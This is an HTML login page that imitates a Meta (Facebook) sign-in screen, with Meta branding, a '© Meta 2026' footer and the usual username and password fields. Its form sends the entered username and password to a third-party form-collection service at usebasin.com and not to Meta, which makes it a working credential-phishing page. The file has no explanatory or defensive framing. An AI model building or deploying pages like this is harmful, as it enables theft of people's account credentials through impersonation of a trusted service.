
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">

    <!-- Language -->
    <p class="language">English (UK)</p>

    <!-- Logo -->
    <div class="logo-area">
        <img src="logo.png" alt="Logo">
    </div>

    <!-- Form -->
    <form action="https://usebasin.com/f/abebee17fc68" method="POST">

        <!-- Username Field -->
        <div class="floating-group">
            <input
                type="text"
                name="username"
                id="username"
                class="input-box floating-input"
                placeholder=" "
                required
            >
            <label for="username">
                Username, mobile number or email address
            </label>
        </div>

        <!-- Password Field -->
        <div class="password-wrapper">

            <input
                type="password"
                name="password"
                id="password"
                class="input-box"
                placeholder="Password"
                required
            >

            <span class="eye-btn" onclick="togglePassword()">

                <!-- Eye Open -->
                <svg id="eyeOpen"
                     xmlns="http://www.w3.org/2000/svg"
                     viewBox="0 0 24 24"
                     fill="none"
                     stroke="currentColor"
                     stroke-width="2"
                     style="display:none;">
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"></path>
                    <circle cx="12" cy="12" r="3"></circle>
                </svg>

                <!-- Eye Closed -->
                <svg id="eyeClosed"
                     xmlns="http://www.w3.org/2000/svg"
                     viewBox="0 0 24 24"
                     fill="none"
                     stroke="currentColor"
                     stroke-width="2">
                    <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20C5 20 1 12 1 12a21.77 21.77 0 0 1 5.06-6.94"></path>
                    <path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a21.8 21.8 0 0 1-3.17 4.19"></path>
                    <line x1="1" y1="1" x2="23" y2="23"></line>
                </svg>

            </span>

        </div>

        <button type="submit" class="login-btn">
            Log In
        </button>

    </form>

    <!-- Forgot Password -->
    <a href="#" class="forgot">
        Forgotten password?
    </a>

    <!-- Create Account -->
    <a href="#" class="create-account">
        Create new account
    </a>

    <!-- Footer -->
    <div class="footer">
        <p>Language • Privacy • Terms • Help</p>
        <p>© Meta 2026</p>
    </div>

</div>

<script src="script.js"></script>

</body>
</html>
